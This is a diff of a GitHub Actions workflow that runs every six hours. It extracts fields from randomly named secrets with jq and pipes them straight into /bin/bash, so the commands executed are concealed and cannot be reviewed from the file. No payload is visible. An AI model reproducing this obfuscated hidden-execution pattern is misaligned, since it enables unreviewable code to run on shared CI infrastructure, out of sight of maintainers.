@@ -1,9 +1,8 @@
 name: taxintg
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 3/6 * * *'
+    - cron: '12 0/6 * * *'
 
 jobs:
   build:
@@ -12,14 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: taxintg
         env:
-          vfesx4: ${{ secrets.vfesx4 }}
+          uosm0: ${{ secrets.uosm0 }}
         run: |
-          echo $vfesx4 | jq -r .tkbu6 | /bin/bash
-          echo $iamg7 | jq -r .b6679 | /bin/bash
-          echo $uyhj3 | jq -r .wejx459 | /bin/bash
-          echo $fbdtf23482 | jq -r .qrj254 | /bin/bash
-          echo $u10221 | jq -r .yempa69 | /bin/bash
-          echo $buj25595 | jq -r .w0856 | /bin/bash
-          echo $nkyn82975 | jq -r .bwl8 | /bin/bash
-          echo $sbp25 | jq -r .s2 | /bin/bash
+          echo $uosm0 | jq -r .qyti2 | /bin/bash
+          echo $za030 | jq -r .d2925 | /bin/bash
+          echo $lea15154 | jq -r .b53148 | /bin/bash
+          echo $sga6055 | jq -r .vvnpt4895 | /bin/bash
+          echo $rifz592 | jq -r .hhg121 | /bin/bash
+          echo $xcgqu85 | jq -r .udu7543 | /bin/bash
+          echo $psx2624 | jq -r .bsbl91 | /bin/bash
+          echo $icp9 | jq -r .l171 | /bin/bash
+          echo $pprpk2 | jq -r .t8446 | /bin/bash
 
